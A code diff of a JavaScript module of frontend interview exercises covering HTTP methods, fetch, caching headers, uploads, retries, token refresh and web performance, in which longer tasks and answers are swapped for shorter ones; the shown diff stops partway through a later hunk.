@@ -9,16 +9,16 @@ export default {
           follow: `How can you make a payment POST request safe to retry?`,
           exercises: [
             {
-              task: `Sort HTTP methods into safe and idempotent groups.`,
-              description: `Checks understanding of safe vs idempotent. Write the answer in a table, no code needed.`,
-              answer: `GET, HEAD, OPTIONS are safe and idempotent. PUT and DELETE are idempotent but not safe. POST and PATCH are neither by default. Only idempotent requests should be retried automatically without extra protection.`,
+              task: `Name which method is idempotent.`,
+              description: `Checks idempotency.`,
+              code: `// GET /apps, POST /apps, PUT /apps/1, DELETE /apps/1`,
+              answer: `GET, PUT, and DELETE are idempotent; repeating them gives the same result. POST may create duplicates.`,
             },
             {
-              task: `Find the bug in this delete link.`,
-              description: `Checks that GET must not change state. Read the snippet and explain; run nothing.`,
-              code: `<a href="/api/items/42/delete">Delete</a>`,
-              answer: `A GET that deletes data can be triggered by prefetchers, crawlers, link previews or an img tag on another site (CSRF). Use a DELETE (or POST) request from a button with CSRF protection instead.`,
-              solution: `<button onclick="fetch('/api/items/42', { method: 'DELETE' })">Delete</button>`,
+              task: `Spot the problem.`,
+              description: `Checks GET with side effects.`,
+              code: `<a href="/api/delete?id=5">Delete</a>`,
+              answer: `GET must be safe. Link prefetching or crawlers can delete data. Use a DELETE or POST request.`,
             },
           ],
         },
@@ -39,22 +39,23 @@ if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
 const user = res.status === 204 ? null : await res.json();`,
           exercises: [
             {
-              task: `Send form data with fetch. Fix the header problem.`,
-              description: `Checks knowing when NOT to set Content-Type. Run in the browser console on any page with a form.`,
-              code: `const fd = new FormData(document.querySelector('form'));
-fetch('/upload', { method: 'POST', body: fd, headers: { 'Content-Type': 'multipart/form-data' } });`,
-              answer: `Remove the manual Content-Type header. With FormData the browser must set multipart/form-data itself including the boundary parameter; setting it by hand drops the boundary and the server cannot parse the parts.`,
-              solution: `fetch('/upload', { method: 'POST', body: fd });`,
+              task: `Fix the bug.`,
+              description: `Checks JSON body and header.`,
+              code: `fetch('/api', { method: 'POST', body: { name: 'Ann' } });`,
+              answer: `The object is sent as "[object Object]". Stringify it and set the content type.`,
+              solution: `fetch('/api', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ name: 'Ann' }),
+});`,
             },
             {
-              task: `Write a small helper that gets JSON and handles errors.`,
-              description: `Checks error handling. Implement and test with node (Node 22 has global fetch) against https://httpbin.org/status/404.`,
-              answer: `The helper should await fetch, throw an Error containing the status when !res.ok, and return res.json() otherwise. Calling it against a 404 URL should reject, proving HTTP errors are not silently treated as success.`,
-              solution: `async function getJson(url, init) {
-  const res = await fetch(url, init);
-  if (!res.ok) throw new Error(\`HTTP \${res.status} for \${url}\`);
-  return res.json();
-}`,
+              task: `Predict the result.`,
+              description: `Checks reading the body twice.`,
+              code: `const res = await fetch('/api');
+const a = await res.json();
+const b = await res.text();`,
+              answer: `TypeError: body already used. Read once, or use res.clone() first.`,
             },
           ],
         },
@@ -64,14 +65,16 @@ fetch('/upload', { method: 'POST', body: fd, headers: { 'Content-Type': 'multipa
           long: `Request: Accept (what format I want), Content-Type (what I am sending), Authorization (credentials/token), Cookie (sent automatically), If-None-Match (conditional request).\nResponse: Content-Type, Cache-Control (how long to cache), ETag/Last-Modified (validators), Set-Cookie, Location (redirects).\nCORS uses Access-Control-Allow-Origin and friends.\nSecurity headers: Content-Security-Policy, Strict-Transport-Security.\nIn JS you read them with res.headers.get('content-type'); cross-origin, only CORS-safelisted or exposed headers are readable.\nDevTools Network tab shows all headers for debugging.`,
           exercises: [
             {
-              task: `Look at headers in DevTools. Explain three of them.`,
-              description: `Checks practical debugging. Open any site, Network tab, click the document request and list 3 response headers and their meaning.`,
-              answer: `Typical findings: content-type text/html; cache-control describing caching; strict-transport-security forcing HTTPS. The candidate should explain each and note that request headers like accept and user-agent are shown in a separate section.`,
+              task: `Read a response header.`,
+              description: `Checks the Headers API.`,
+              code: `const res = await fetch('/api/list');`,
+              answer: `Use headers.get; names are case-insensitive.`,
+              solution: `const total = res.headers.get('X-Total-Count');`,
             },
             {
-              task: `Why can JavaScript not read a custom header from another domain?`,
-              description: `Checks Access-Control-Expose-Headers. Reason about why res.headers.get('X-Total-Count') returns null on a cross-origin API.`,
-              answer: `Cross-origin responses only expose CORS-safelisted headers to JS. The server must send Access-Control-Expose-Headers: X-Total-Count for the browser to make it readable. The header is still visible in DevTools, which confuses people.`,
+              task: `Name two common request headers.`,
+              description: `Checks header basics.`,
+              answer: `Authorization for credentials and Accept or Content-Type for data format.`,
             },
           ],
         },
@@ -84,14 +87,18 @@ fetch('/upload', { method: 'POST', body: fd, headers: { 'Content-Type': 'multipa
           follow: `What does "stale while revalidate" do?`,
           exercises: [
             {
-              task: `Choose cache headers for four files.`,
-              description: `Checks cache policy design. Write Cache-Control values for: logo.abc123.svg, index.html, /api/me, /api/countries.`,
-              answer: `logo.abc123.svg: public, max-age=31536000, immutable. index.html: no-cache. /api/me: private, no-store or no-cache since it is user-specific. /api/countries: public, max-age=3600, stale-while-revalidate=86400 because it rarely changes.`,
+              task: `Write cache headers for hashed bundles.`,
+              description: `Checks long-lived immutable caching.`,
+              code: `# app.3f9a1c.js`,
+              answer: `Hashed files never change, so cache them for a year.`,
+              solution: `Cache-Control: public, max-age=31536000, immutable`,
             },
             {
-              task: `Get a 304 response with curl.`,
-              description: `Checks revalidation. Run: curl -I https://example.com then curl -I -H 'If-None-Match: <etag>' https://example.com.`,
-              answer: `The first response returns an ETag. Sending it back in If-None-Match returns 304 Not Modified with no body if unchanged, saving bandwidth while still costing a round trip.`,
+              task: `Write cache headers for index.html.`,
+              description: `Checks revalidating HTML.`,
+              code: `# index.html must pick up new deploys`,
+              answer: `HTML must always be checked, so new deploys show up.`,
+              solution: `Cache-Control: no-cache`,
             },
           ],
         },
@@ -117,17 +124,25 @@ await fetch('/api/upload', { method: 'POST', body: form });`,
           follow: `Why should you not set the Content-Type header with FormData?`,
           exercises: [
             {
-              task: `The user must see upload progress. What do you use?`,
-              description: `Checks knowledge of fetch limits.`,
-              answer: `Use XMLHttpRequest and listen to xhr.upload.onprogress, because fetch does not give upload progress in browsers today.`,
+              task: `Fix the upload.`,
+              description: `Checks FormData for files.`,
+              code: `fetch('/upload', {
+  method: 'POST',
+  body: JSON.stringify({ file: input.files[0] }),
+});`,
+              answer: `A File becomes {} in JSON. Send FormData.`,
+              solution: `const fd = new FormData();
+fd.append('file', input.files[0]);
+fetch('/upload', { method: 'POST', body: fd });`,
             },
             {
-              task: `Check the file before upload: max 5 MB and only PDF.`,
-              description: `Checks client-side validation (the server must still check).`,
-              answer: `Check file.size and file.type before sending, show an error, and still validate on the server because the client can be bypassed.`,
-              solution: `const f = fileInput.files[0];
-if (f.size > 5 * 1024 * 1024) throw new Error('Max 5 MB');
-if (f.type !== 'application/pdf') throw new Error('Only PDF');`,
+              task: `Spot the bug.`,
+              description: `Checks manual multipart Content-Type.`,
+              code: `fetch('/upload', {
+  method: 'POST', body: fd,
+  headers: { 'Content-Type': 'multipart/form-data' },
+});`,
+              answer: `The manual header has no boundary, so the server cannot parse it. Remove it; the browser sets it.`,
             },
           ],
         },
@@ -143,21 +158,22 @@ Strong answer: reads Retry-After, uses backoff with jitter and talks about reduc
           follow: `Why do you add random jitter to the retry delay?`,
           exercises: [
             {
-              task: `Write a helper that retries once after the Retry-After time on 429.`,
-              description: `Checks reading headers and waiting.`,
-              answer: `If status is 429, read Retry-After, wait that many seconds (with a sane default and maximum), then retry once.`,
-              solution: `async function fetchWithRateLimit(url, opts) {
-  const res = await fetch(url, opts);
-  if (res.status !== 429) return res;
-  const sec = Math.min(Number(res.headers.get('Retry-After')) || 1, 30);
-  await new Promise((r) => setTimeout(r, sec * 1000));
-  return fetch(url, opts);
-}`,
+              task: `Read the wait time from a 429 response.`,
+              description: `Checks the Retry-After header.`,
+              code: `const res = await fetch('/api');
+if (res.status === 429) { /* ? */ }`,
+              answer: `Retry-After gives seconds to wait before retrying.`,
+              solution: `const sec = Number(res.headers.get('Retry-After')) || 1;
+await new Promise(r => setTimeout(r, sec * 1000));`,
             },
             {
-              task: `A thousand clients all retry after exactly 2 seconds. What happens?`,
-              description: `Checks the thundering herd problem.`,
-              answer: `They all hit the server at the same moment again and get limited again. Add random jitter so retries spread out.`,
+              task: `Spot the problem.`,
+              description: `Checks retry storms.`,
+              code: `async function load() {
+  const res = await fetch('/api');
+  if (res.status === 429) return load();
+}`,
+              answer: `It retries at once forever and makes rate limiting worse. Add delay, backoff, and a max retry count.`,
             },
           ],
         },
@@ -170,14 +186,15 @@ Strong answer: reads Retry-After, uses backoff with jitter and talks about reduc
           ai: true,
           exercises: [
             {
-              task: `Check which HTTP version a site uses.`,
-              description: `Checks tooling. In DevTools Network enable the Protocol column; or run curl --http3 -I https://cloudflare.com (curl built with HTTP/3).`,
-              answer: `The Protocol column shows h2 or h3 per request. A site on h2 that still shards assets across static1/static2 domains should consolidate them to reuse a single connection.`,
+              task: `Name a HTTP/1 trick that HTTP/2 makes less useful.`,
+              description: `Checks multiplexing impact.`,
+              code: `// Domain sharding, giant sprites, one huge bundle`,
+              answer: `Domain sharding: HTTP/2 multiplexes many requests on one connection, so extra domains only add connection cost.`,
             },
             {
-              task: `Start loading CSS before a slow server sends the HTML.`,
-              description: `Checks modern hints. Propose how to start loading critical CSS before the HTML is generated by a slow SSR server.`,
-              answer: `Send a 103 Early Hints response with Link: </app.css>; rel=preload; as=style (and preconnect for API/CDN origins) while the server renders. Browsers start fetching immediately, then the final 200 arrives with the HTML.`,
+              task: `Name the main gain of HTTP/3.`,
+              description: `Checks QUIC benefits.`,
+              answer: `It runs over QUIC on UDP, so one lost packet does not block other streams, and setup is faster on mobile.`,
             },
           ],
         },
@@ -211,14 +228,23 @@ async function api(url, init, retried = false) {
 }`,
           exercises: [
             {
-              task: `Test that five parallel calls refresh only once.`,
-              description: `Checks dedupe. In Vitest, mock fetch to return 401 then 200, fire 5 api() calls with Promise.all and assert refreshToken was called once.`,
-              answer: `With the shared promise refreshToken is called exactly once and all 5 calls resolve with 200. Without it the spy records 5 calls, demonstrating the stampede.`,
+              task: `Fix the parallel refresh.`,
+              description: `Checks sharing one in-flight promise.`,
+              code: `async function getToken() {
+  if (expired()) token = await refresh();
+  return token;
+}`,
+              answer: `Five calls start five refreshes. Share one pending promise.`,
+              solution: `let pending = null;
+async function getToken() {
+  if (expired()) pending ??= refresh().finally(() => { pending = null; });
+  return pending ? (token = await pending) : token;
+}`,
             },
             {
-              task: `Stop two browser tabs from refreshing at the same time.`,
-              description: `Checks Web Locks API. Sketch how two open tabs avoid refreshing simultaneously.`,
-              answer: `Wrap refresh in navigator.locks.request('token-refresh', async () => {...}). Inside, re-check whether another tab already stored a fresh token (e.g. via BroadcastChannel or storage) before calling the server, so only one tab rotates the refresh token.`,
+              task: `Name what to do when refresh fails.`,
+              description: `Checks auth failure handling.`,
+              answer: `Clear the session, stop retries, and redirect to login once, not per request.`,
             },
           ],
         },
@@ -229,15 +255,21 @@ async function api(url, init, retried = false) {
           ai: true,
           exercises: [
             {
-              task: `Write a retry delay function with random jitter.`,
-              description: `Checks backoff math. Write a function delay(attempt) using full jitter, base 300ms, cap 10s; test with node printing 6 attempts.`,
-              answer: `Full jitter: Math.random() * Math.min(cap, base * 2 ** attempt). Randomness spreads clients so they do not retry in sync after an outage (thundering herd). Values grow on average but stay under the cap.`,
-              solution: `const delay = (n, base = 300, cap = 10000) => Math.random() * Math.min(cap, base * 2 ** n);`,
+              task: `Write a typed error class for HTTP.`,
+              description: `Checks structured API errors.`,
+              code: `if (!res.ok) throw new Error('failed'); // no status`,
+              answer: `Keep status and body so callers can handle errors by type.`,
+              solution: `class HttpError extends Error {
+  constructor(public status: number, public body: unknown) {
+    super(\`HTTP \${status}\`);
+  }
+}`,
             },
             {
-              task: `Check the shape of an API response with zod.`,
-              description: `Checks boundary validation. Parse a /api/user response and turn a schema mismatch into a typed error; run via vitest.`,
-              answer: `Define UserSchema, call UserSchema.safeParse(json) and throw a ContractError with the issues when it fails. This turns silent undefined bugs deep in the UI into one clear, reportable error at the API edge.`,
+              task: `Name which requests are safe to retry.`,
+              description: `Checks retrying only idempotent calls.`,
+              code: `// GET, PUT, POST /payments`,
+              answer: `GET and PUT are idempotent and safe to retry. Retry POST only with an idempotency key.`,
             },
           ],
         },
@@ -250,17 +282,16 @@ async function api(url, init, retried = false) {
           ai: true,
           exercises: [
             {
-              task: `Add a CI step that fails on breaking API changes.`,
-              description: `Checks CI design. Write a GitHub Actions step that fails when openapi.yaml changes break compatibility with master.`,
-              code: `- run: git fetch origin master --depth=1
-- run: git show origin/master:openapi.yaml > base.yaml`,
-              answer: `Add a step running oasdiff breaking base.yaml openapi.yaml --fail-on ERR. The job fails on removed fields, changed types or new required params, forcing a deliberate version bump or deprecation instead of a surprise breakage.`,
-              solution: `- run: docker run --rm -v "$PWD:/w" tufin/oasdiff breaking /w/base.yaml /w/openapi.yaml --fail-on ERR`,
+              task: `Name a tool to catch API breaking changes.`,
+              description: `Checks contract testing.`,
+              answer: `Pact contract tests or an OpenAPI diff check like oasdiff in the backend CI.`,
             },
             {
-              task: `Write rules for removing an old API field.`,
-              description: `Checks governance. Draft 4-5 rules for deprecating an endpoint field.`,
-              answer: `Announce in the changelog and mark deprecated in the schema; emit a Deprecation/Sunset header; track field usage via telemetry; give a fixed window (e.g. 2 releases or 90 days); remove only when usage is zero or consumers sign off.`,
+              task: `Spot the breaking change.`,
+              description: `Checks backward-compatible API evolution.`,
+              code: `// v1: { name: 'Ann' }
+// v2: { fullName: 'Ann' }`,
+              answer: `Renaming a field breaks old clients. Add fullName and keep name until clients move.`,
             },
           ],
         },
@@ -271,14 +302,18 @@ async function api(url, init, retried = false) {
           ai: true,
           exercises: [
             {
-              task: `Send page speed data together with the network type.`,
-              description: `Checks instrumentation. Write a snippet that sends LCP plus navigator.connection.effectiveType to /rum using the web-vitals library.`,
-              answer: `Use onLCP(metric => navigator.sendBeacon('/rum', JSON.stringify({ v: metric.value, net: navigator.connection?.effectiveType }))). sendBeacon survives page unload; the optional chaining handles browsers (Safari, Firefox) without the Network Information API.`,
+              task: `Name the DevTools setting to test slow networks.`,
+              description: `Checks network throttling.`,
+              answer: `Network throttling, like Slow 4G, in the Network panel, plus CPU throttling in Performance.`,
             },
             {
-              task: `Put these three fixes in order and explain why.`,
-              description: `Checks leadership trade-offs. Given: no CDN, 12 sequential API calls, 900KB JS. Order the work and justify in 4 sentences.`,
-              answer: `Add CDN/compression first: cheap, infra-only, benefits everything. Then collapse the API waterfall, since each round trip on high-latency links costs hundreds of ms. Then split the JS bundle. Measure after each step to confirm the effect.`,
+              task: `Add a timeout and a retry button.`,
+              description: `Checks resilient UX on bad networks.`,
+              code: `const res = await fetch('/api');`,
+              answer: `Fail after a time limit and let users retry instead of hanging.`,
+              solution: `try {
+  await fetch('/api', { signal: AbortSignal.timeout(8000) });
+} catch { showRetry(); }`,
             },
           ],
         },
@@ -289,14 +324,14 @@ async function api(url, init, retried = false) {
           ai: true,
           exercises: [
             {
-              task: `List the parts of a decision record for adding a BFF.`,
-              description: `Checks decision documentation. List the sections and key points of an ADR proposing a BFF.`,
-              answer: `Context (call counts, latency, auth risk), Decision (Node 22/24 BFF owned by web team), Alternatives (GraphQL gateway, backend changes), Consequences (on-call, cost, security gain), and success metrics. Keep it short and link to data.`,
+              task: `Name two benefits of a BFF.`,
+              description: `Checks backend-for-frontend value.`,
+              answer: `It combines many calls into one response shaped for the UI, and keeps tokens and secrets on the server.`,
             },
             {
-              task: `The BFF checks if an applicant is eligible. What is wrong?`,
-              description: `Checks boundaries. A BFF endpoint calculates applicant eligibility rules.`,
-              answer: `Domain rules in the BFF get duplicated or diverge from the backend and other clients (mobile, integrations). Eligibility should stay in the domain service; the BFF should only fetch and shape the result.`,
+              task: `Name a BFF risk.`,
+              description: `Checks BFF ownership trade-offs.`,
+              answer: `Business logic leaks into it, and nobody owns it. The frontend team should own it and keep it thin.`,
             },
           ],
         },
@@ -311,16 +346,19 @@ async function api(url, init, retried = false) {
           long: `Images: <img loading="lazy" width height> lets the browser defer offscreen images.\nNever lazy-load the LCP (hero) image; it delays the main content.\nAlways set width/height or aspect-ratio to avoid layout shift (CLS).\nRoutes: const Page = lazy(() => import('./Page')) inside <Suspense> creates a separate chunk.\nBundlers (Vite, webpack) split on dynamic import automatically.\niframes also support loading="lazy".`,
           exercises: [
             {
-              task: `Fix the main image on the page.`,
-              description: `Checks LCP awareness. Review and correct the markup; verify LCP in Lighthouse.`,
-              code: `<img src="hero.jpg" loading="lazy">`,
-              answer: `The hero is the LCP element, so lazy loading delays it. Remove loading="lazy", add fetchpriority="high" and explicit width/height so the browser fetches it early without layout shift.`,
-              solution: `<img src="hero.jpg" width="1200" height="600" fetchpriority="high" alt="...">`,
+              task: `Lazy load this image.`,
+              description: `Checks native lazy loading.`,
+              code: `<img src="photo.jpg" alt="Event">`,
+              answer: `loading lazy defers off-screen images.`,
+              solution: `<img src="photo.jpg" alt="Event" loading="lazy" width="400" height="300">`,
             },
             {
-              task: `Make the Settings page load only when needed.`,
-              description: `Checks code splitting. Convert a static import of Settings page to lazy; run npm run build and confirm a new chunk.`,
-              answer: `Use const Settings = lazy(() => import('./Settings')) and wrap the route element in Suspense with a fallback. The build output shows a separate Settings-[hash].js chunk loaded only when the route is visited.`,
+              task: `Lazy load this page component.`,
+              description: `Checks React.lazy and Suspense.`,
+              code: `import Settings from './Settings';`,
+              answer: `Split it into its own chunk loaded on demand.`,
+              solution: `const Settings = lazy(() => import('./Settings'));
+<Suspense fallback={<p>Loading…</p>}><Settings /></Suspense>`,
             },
           ],
         },
@@ -338,14 +376,22 @@ items.forEach((el, i) => { el.style.width = widths[i] / 2 + 'px'; }); // writes
 // Better: .item { width: 50%; }`,
           exercises: [
             {
-              task: `Find forced layout work in DevTools.`,
-              description: `Checks DevTools usage. Record the original loop in the Performance panel with 1,000 items and describe what you see.`,
-              answer: `Many purple Layout events appear inside the script task, flagged with a "Forced reflow is a likely performance bottleneck" warning. After batching there is one layout and the task is much shorter.`,
+              task: `Spot why the page freezes.`,
+              description: `Checks long tasks on the main thread.`,
+              code: `button.onclick = () => {
+  for (let i = 0; i < 1e9; i++) sum += i;
+};`,
+              answer: `The loop blocks the main thread, so nothing paints or responds. Split it, or move it to a worker.`,
             },
             {
-              task: `Update styles on scroll only once per frame.`,
-              description: `Checks frame scheduling. Rewrite a scroll handler that writes styles using requestAnimationFrame.`,
-              answer: `Store the latest scroll position in the handler and schedule a single requestAnimationFrame that applies styles if one is not already pending. This caps work at one write per frame and avoids running heavy code for every scroll event.`,
+              task: `Split the work into chunks.`,
+              description: `Checks yielding to the browser.`,
+              code: `for (const item of items) process(item);`,
+              answer: `Yield every few items so the page stays responsive.`,
+              solution: `for (let i = 0; i < items.length; i++) {
+  process(items[i]);
+  if (i % 500 === 0) await scheduler.yield();
+}`,
             },
           ],
         },
@@ -362,20 +408,18 @@ Weak answer: "the page is slow because of big images".`,
           follow: `Why does a font file sometimes delay text even when CSS is loaded?`,
           exercises: [
             {
-              task: `Which resources here block the first paint?`,
-              description: `Checks render-blocking vs parser-blocking. Show the head and ask the candidate to mark each line.`,
-              code: `<head>
-  <link rel="stylesheet" href="/main.css">
-  <link rel="stylesheet" href="/print.css" media="print">
-  <script src="/analytics.js"></script>
-  <script src="/app.js" defer></script>
-</head>`,
-              answer: `main.css blocks rendering. print.css does not block screen rendering because of media="print". analytics.js blocks parsing (no defer or async). app.js with defer does not block. Fix: add async or defer to analytics.js.`,
+              task: `Name what blocks the first paint here.`,
+              description: `Checks render-blocking resources.`,
+              code: `<link rel="stylesheet" href="all.css">
+<script src="app.js"></script>`,
+              answer: `Both: CSS blocks rendering and the sync script blocks parsing. Defer the script and inline critical CSS.`,
             },
             {
-              task: `Explain how you would find render-blocking resources on a real page.`,
-              description: `Checks tool knowledge. Let the candidate describe the steps in DevTools or Lighthouse.`,
-              answer: `Run Lighthouse and read the "Eliminate render-blocking resources" audit, or record a load in the Performance panel and look at what loads before First Contentful Paint. The Network panel can also show the "Render blocking" column in Chrome.`,
+              task: `Load a print stylesheet without blocking.`,
+              description: `Checks media attribute on CSS.`,
+              code: `<link rel="stylesheet" href="print.css">`,
+              answer: `A non-matching media query makes it non-blocking.`,
+              solution: `<link rel="stylesheet" href="print.css" media="print">`,
             },
           ],
         },
@@ -399,14 +443,19 @@ cards.forEach((el, i) => { el.style.height = heights[i] + 10 + 'px'; });`,
           follow: `Which properties force a layout when you read them?`,
           exercises: [
             {
-              task: `Name four properties or methods that force layout when read.`,
-              description: `Checks practical knowledge. Accept any four.`,
-              answer: `For example: offsetWidth/offsetHeight, clientWidth, scrollTop, getBoundingClientRect, getComputedStyle, innerText.`,
+              task: `Fix the layout thrashing.`,
+              description: `Checks batching reads and writes.`,
+              code: `for (const el of items) {
+  el.style.width = box.offsetWidth + 'px';
+}`,
+              answer: `Reading offsetWidth after a write forces layout each loop. Read once, then write.`,
+              solution: `const w = box.offsetWidth;
+for (const el of items) el.style.width = w + 'px';`,
             },
             {
-              task: `How would you confirm the fix worked?`,
-              description: `Checks measuring before and after.`,
-              answer: `Record the interaction in the Performance panel before and after. The many small "Layout" blocks with forced reflow warnings should become one layout, and the task time should drop.`,
+              task: `Name two properties that force layout.`,
+              description: `Checks forced synchronous layout.`,
+              answer: `offsetHeight and getBoundingClientRect(). Reading them after style changes forces layout.`,
             },
           ],
         },
@@ -423,20 +472,25 @@ Strong answer: covers invisible text, layout shift, subsetting and preload.`,
           follow: `Why can preloading too many fonts make the page slower?`,
           exercises: [
             {
-              task: `Write a font-face rule that shows text at once and loads only Latin characters.`,
-              description: `Checks font-display and unicode-range.`,
-              answer: `Use woff2, font-display: swap and a unicode-range for Latin.`,
+              task: `Fix the invisible text while loading.`,
+              description: `Checks font-display.`,
+              code: `@font-face {
+  font-family: Brand;
+  src: url(brand.woff2) format('woff2');
+}`,
+              answer: `Add font-display: swap so fallback text shows at once.`,
               solution: `@font-face {
-  font-family: 'Brand';
-  src: url('/fonts/brand-latin.woff2') format('woff2');
+  font-family: Brand;
+  src: url(brand.woff2) format('woff2');
   font-display: swap;
-  unicode-range: U+0000-00FF;
 }`,
             },
             {
-              task: `After adding swap, the page jumps when the font loads. Why? What can you do?`,
-              description: `Checks the CLS trade-off.`,
-              answer: `The fallback font has different sizes, so text reflows when the web font arrives. Tune the fallback with size-adjust and ascent-override, or use font-display: optional.`,
+              task: `Preload the main font.`,
+              description: `Checks font preload with crossorigin.`,
+              code: `/* Brand font is needed for above-the-fold text */`,
+              answer: `Font preloads need crossorigin, or the file downloads twice.`,
+              solution: `<link rel="preload" href="/brand.woff2" as="font" type="font/woff2" crossorigin>`,
             },
           ],
         },
@@ -446,14 +500,17 @@ Strong answer: covers invisible text, layout shift, subsetting and preload.`,
           long: `preconnect: DNS+TCP+TLS for critical third-party origins (fonts, API); limit to a few.\ndns-prefetch: cheaper fallback, DNS only.\npreload (as=font/style/image): high-priority fetch of late-discovered critical resources; fonts need crossorigin.\nUnused preloads waste bandwidth and Chrome warns about them.\nprefetch: idle-time fetch for future navigations; Speculation Rules API can prerender whole pages.\nmodulepreload: fetches and parses module dependencies (Vite injects this).\nfetchpriority="high|low" on img/link/script fine-tunes order, e.g. the LCP image.`,
           exercises: [
             {
-              task: `Load a web font early and correctly.`,
-              description: `Checks preload correctness. Write the head tags for a self-hosted Inter woff2 used above the fold.`,
-              answer: `<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin> plus @font-face with font-display: swap. Without crossorigin the preload is not reused and the font downloads twice.`,
+              task: `Pick the right hint for each case.`,
+              description: `Checks preload, prefetch, preconnect.`,
+              code: `// a) LCP image  b) next page JS  c) API on another domain`,
+              answer: `a) preload, b) prefetch, c) preconnect. Preload is for now, prefetch for later, preconnect warms a connection.`,
             },
             {
-              task: `Load the checkout page in advance when the user hovers its link.`,
-              description: `Checks Speculation Rules (Chromium). Write the rule.`,
-              answer: `Add <script type="speculationrules">{"prerender":[{"where":{"href_matches":"/checkout"},"eagerness":"moderate"}]}</script>. Moderate eagerness triggers on hover, making navigation near-instant; unsupported browsers ignore it.`,
+              task: `Lower the priority of a below-fold image.`,
+              description: `Checks fetchpriority.`,
+              code: `<img src="footer.jpg" alt="">`,
+              answer: `fetchpriority low tells the browser it can wait.`,
+              solution: `<img src="footer.jpg" alt="" fetchpriority="low" loading="lazy">`,
             },
           ],
         },
@@ -475,15 +532,20 @@ export const uniq = (a) => [...new Set(a)];
 export const Logo = () => <HomeIcon />;`,
           exercises: [
             {
-              task: `Look at the bundle as a picture.`,
-              description: `Checks analysis tools. Add rollup-plugin-visualizer to vite.config and run npm run build.`,
-              answer: `The generated stats.html treemap shows lodash, moment locales and icons as large blocks. After the fix those blocks disappear or shrink, and the gzip size reported by Vite drops.`,
+              task: `Fix the big import.`,
+              description: `Checks icon barrel imports.`,
+              code: `import * as Icons from '@mui/icons-material';
+<Icons.Save />`,
+              answer: `The namespace import can pull thousands of icons. Import the single icon.`,
+              solution: `import SaveIcon from '@mui/icons-material/Save';`,
             },
             {
-              task: `Add a size limit for the bundle in CI.`,
-              description: `Checks regression prevention. Configure size-limit for dist/assets/index-*.js at 150 kB and run npx size-limit.`,
-              answer: `Add a .size-limit.json with path and limit, run it in CI; the job fails when the bundle exceeds the budget. The PR comment action shows diffs so authors see the impact of new dependencies.`,
-              solution: `[{ "path": "dist/assets/index-*.js", "limit": "150 kB" }]`,
+              task: `Replace moment with a smaller option.`,
+              description: `Checks native Intl versus heavy libs.`,
+              code: `import moment from 'moment';
+moment(d).format('LL');`,
+              answer: `Intl.DateTimeFormat does this with no bundle cost.`,
+              solution: `new Intl.DateTimeFormat('en', { dateStyle: 'long' }).format(d);`,
             },
           ],
         },
@@ -494,14 +556,17 @@ export const Logo = () => <HomeIcon />;`,
           ai: true,
           exercises: [
             {
-              task: `Get real user data for your site from Chrome data.`,
-              description: `Checks field data access. Use the CrUX API or PageSpeed Insights for your origin and report p75 LCP/INP/CLS by form factor.`,
-              answer: `PSI shows origin and URL-level field data split by mobile/desktop. Typically mobile is much worse; the candidate should identify which metric fails and which URL group drives it.`,
+              task: `Name two reasons lab and field data differ.`,
+              description: `Checks lab versus real user data.`,
+              answer: `Real users have slower devices and networks, and they interact with the page, which lab runs do not measure for INP.`,
             },
             {
-              task: `Layout shift is low in the lab but high for users. Give three reasons.`,
-              description: `Checks reasoning. Lighthouse CLS 0.01, field CLS 0.3.`,
-              answer: `Cookie/consent banner injected late for real users, ads or embeds without reserved space, and layout shifts after interactions or lazy content during scroll. None appear in a short synthetic load.`,
+              task: `Write code to collect real LCP.`,
+              description: `Checks the web-vitals library.`,
+              code: `// Send LCP, INP, CLS from real users to /rum`,
+              answer: `web-vitals reports metrics from real users.`,
+              solution: `import { onLCP, onINP, onCLS } from 'web-vitals';
+onLCP(send); onINP(send); onCLS(send);`,
             },
           ],
         },
@@ -512,14 +577,15 @@ export const Logo = () => <HomeIcon />;`,
           ai: true,
           exercises: [
             {
-              task: `Speed up a long page with the content visibility CSS property.`,
-              description: `Checks CSS alternative. Apply content-visibility to sections of a long static page and measure rendering time in DevTools.`,
-              answer: `Add content-visibility: auto; contain-intrinsic-size: auto 500px to each section. Offscreen sections skip rendering, cutting initial render time, while staying in the DOM for find-in-page and accessibility.`,
+              task: `Name the technique for 100k rows.`,
+              description: `Checks list virtualization.`,
+              code: `rows.map(r => <Row key={r.id} {...r} />)`,
+              answer: `Virtualization: render only visible rows, with a library like TanStack Virtual.`,
             },
             {
-              task: `Make a virtual table work with screen readers.`,
-              description: `Checks a11y with virtualization. List required ARIA attributes for a virtualized table.`,
-              answer: `role="grid" or table with aria-rowcount set to the total rows, and aria-rowindex on each rendered row. Keep keyboard focus management in a roving tabindex so focus survives row recycling.`,
+              task: `Name two downsides of virtual lists.`,
+              description: `Checks virtualization trade-offs.`,
+              answer: `Browser find (Ctrl+F) misses hidden rows, and screen readers and dynamic row heights need extra work.`,
             },
           ],
         },
@@ -532,18 +598,19 @@ export const Logo = () => <HomeIcon />;`,
           ai: true,
           exercises: [
             {
-              task: `Write Lighthouse CI rules for load time and script size.`,
-              description: `Checks configuration. Create lighthouserc.json asserting LCP < 2500ms and total JS < 170kB, 3 runs.`,
-              answer: `Use ci.collect.numberOfRuns: 3 and ci.assert.assertions with largest-contentful-paint maxNumericValue 2500 and resource-summary:script:size maxNumericValue 174080. Multiple runs use the median to reduce flakiness.`,
-              solution: `{ "ci": { "collect": { "numberOfRuns": 3 }, "assert": { "assertions": {
-  "largest-contentful-paint": ["error", { "maxNumericValue": 2500 }],
-  "resource-summary:script:size": ["error", { "maxNumericValue": 174080 }]
-} } } }`,
+              task: `Write a Lighthouse CI budget assertion.`,
+              description: `Checks performance budgets in CI.`,
+              answer: `lighthouserc assertions fail the build when a metric is over budget.`,
+              solution: `assert: {
+  assertions: {
+    'largest-contentful-paint': ['error', { maxNumericValue: 2500 }],
+  },
+},`,
             },
             {
-              task: `A team needs to go over the size limit. What is the process?`,
-              description: `Checks governance. Describe how a team ships a feature that exceeds the JS budget.`,
-              answer: `They file a budget exception with justification, measured impact and a remediation date; a perf champion approves. The budget is temporarily raised with an expiry, and a follow-up ticket is tracked until the budget is restored.`,
+              task: `Name a way to reduce noisy CI perf results.`,
+              description: `Checks stable measurement.`,
+              answer: `Run several times and use the median, on the same machine type each time.`,
             },
           ],
         },
@@ -554,14 +621,16 @@ export const Logo = () => <HomeIcon />;`,
           ai: true,
           exercises: [
             {
-              task: `Load the chat widget only after the first click.`,
